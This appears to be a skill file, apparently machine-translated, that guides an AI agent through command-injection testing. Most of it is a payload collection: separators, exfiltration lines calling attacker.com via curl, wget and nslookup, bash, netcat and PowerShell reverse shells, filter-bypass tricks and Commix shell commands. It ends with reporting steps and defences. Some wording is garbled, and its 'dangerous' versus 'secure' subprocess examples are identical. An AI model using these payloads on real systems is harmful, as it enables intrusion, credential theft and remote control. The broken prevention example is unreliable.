---
name: command-injection-testing
Discretion: Command to inject professional skills and methodology for vulnerability testing
version: 1.0.0
---

# Command injection bug test.

## Overview

Command injection is a bug in the application to execute system commands. When an application transmits a user input directly to a system command, the attacker can execute any command.

## Vulnerability Principle

The application calls the system command without sufficient validation and filtering of the user input, which allows the attacker to inject additional commands.

**Example of hazard code:**
```php
// PHP
system("ping " . $_GET['ip']);

// Python
os.system("ping " + user_input)

// Node.js
child_process.exec("ping " + user_input)
```

## Test Method

### 1. Identification of command executors

**Common function:**
- PingFeature
- DNSQuery
- File Operation
- System Information
- Log View
- Backup Restore

### 2. Basic Detection

**Test command separator:**
```
; #Command Separator (Linux/Windows)
& #BackstageXecution(Linux/Windows)
| # Pipe (Linux/Windows)
&& # Logical AND (Linux/Windows)
|| # Logical OR (Linux/Windows)
`#CommandReplace (Linux)
$() #Command Replac (Linux)
```

**Test Payload:**
```
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1 `whoami`
127.0.0.1 $(whoami)
```

### 3. Blind command injection.

**Late detection:**
```
127.0.0.1; sleep 5
127.0.0.1 && sleep 5
127.0.0.1 | sleep 5
```

**Extra data:**
```
127.0.0.1; curl http://attacker.com/?$(whoami)
127.0.0.1 && wget http://attacker.com/$(cat /etc/passwd)
```

**DNS belt:**
```
127.0.0.1; nslookup $(whoami).attacker.com
```

## Exploitation Techniques

### Basic Command Execution

**Linux:**
```
; id
; whoami
; uname -a
; cat /etc/passwd
; ls -la
```

**Windows:**
```
& whoami
& ipconfig
& type C:\Windows\System32\drivers\etc\hosts
& dir
```

### File Operation

**Read the file:**
```
; cat /etc/passwd
; type C:\Windows\System32\config\sam
; head -n 20 /var/log/apache2/access.log
```

**Writing to file:**
```
; echo "<?php phpinfo(); ?>" > /tmp/shell.php
; echo "test" > C:\temp\test.txt
```

### Rewind! Shell

**Bash:**
```
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Netcat:**
```
; nc -e /bin/bash attacker.com 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

**PowerShell:**
```
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Bypass Techniques

### Space around

```
${IFS}id
${IFS}whoami
$IFS$9id
<>
%09 (Tab)
%20 (Space)
```

### Command separator bypassed

**Encoded around:**
```
%3b (;)
%26 (&)
%7c (|)
```

**Wrapping around:**
```
%0a (Line Break)
%0d (Get back in the car.)
```

### Keyword filtering around

**Variable integration:**
```bash
a=w;b=ho;c=ami;$a$b$c
```

**wildcards:**
```bash
/bin/c?t /etc/passwd
/usr/bin/ca* /etc/passwd
```

**Quote bypassed:**
```bash
w'h'o'a'm'i
w"h"o"a"m"i
```

**Anti-slash:**
```bash
w\ho\am\i
```

**Base64 encoding:**
```bash
echo "d2hvYW1p" | base64 -d | bash
```

### Length limit bypass

**Use of documents:**
```bash
echo "id" > /tmp/c
sh /tmp/c
```

**Using environmental variables:**
```bash
export x='id';$x
```

## Using the Tools

### Commix

```bash
# Basic scan
python commix.py -u "http://target.com/ping?ip=127.0.0.1"

# Specify the injection point
python commix.py -u "http://target.com/ping?ip=INJECT_HERE" --data="ip=INJECT_HERE"

# GetShell
python commix.py -u "http://target.com/ping?ip=127.0.0.1" --os-shell
```

### Burp Suite

1. Intercept the request
2. Send toIntruder
3. Use command to inject the Payload list
4. Observation response or delay

## Verification and Reporting

### Verification Steps

1. Confirm that you can execute the system command.
2. Validate command execution results
3. Assess the impact (system control, data disclosure, etc.)
4. Record the completePOC
5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration

### Reporting Checklist

- Vulnerability location and input parameter
- Type of executable command
- the complete exploitation steps andPOC
- Remediation recommendations (entry validation, parameterization, white list, etc.)

## Preventive Measures

### Recommended Approach

1. **Avoid command execution**
   - Use API replacement system command
   - Use library function instead of command

2. **Input Validation**
   ```python
   import re

   def validate_ip(ip):
       pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
       if not re.match(pattern, ip):
           raise ValueError("Invalid IP")
       parts = ip.split('.')
       if not all(0 <= int(p) <= 255 for p in parts):
           raise ValueError("Invalid IP range")
       return ip
   ```

3. **Parametric Commands**
   ```python
   import subprocess

   # Dangerous.
   subprocess.call(['ping', '-c', '1', user_input])

   # Security - Use list of parameters
   subprocess.call(['ping', '-c', '1', validated_ip])
   ```

4. **Allowlist Validation**
   ```python
   ALLOWED_COMMANDS = ['ping', 'nslookup']
   ALLOWED_OPTIONS = {'ping': ['-c', '-n']}

   if command not in ALLOWED_COMMANDS:
       raise ValueError("Command not allowed")
   ```

5. **Least Privilege**
   - Run application using low permission users
   - Restricted document system access
   - Isolation by chroot or container

6. **Output Filter**
   - Limit Output Contents
   - Filter sensitive information
   - Record Command Execution Log

## Important Notes

- Perform only in an authorized testing environment
- Avoid damage to the system.
- Watch for differences in command between operating systems.
- Pay attention to the range of effects of command execution when testing
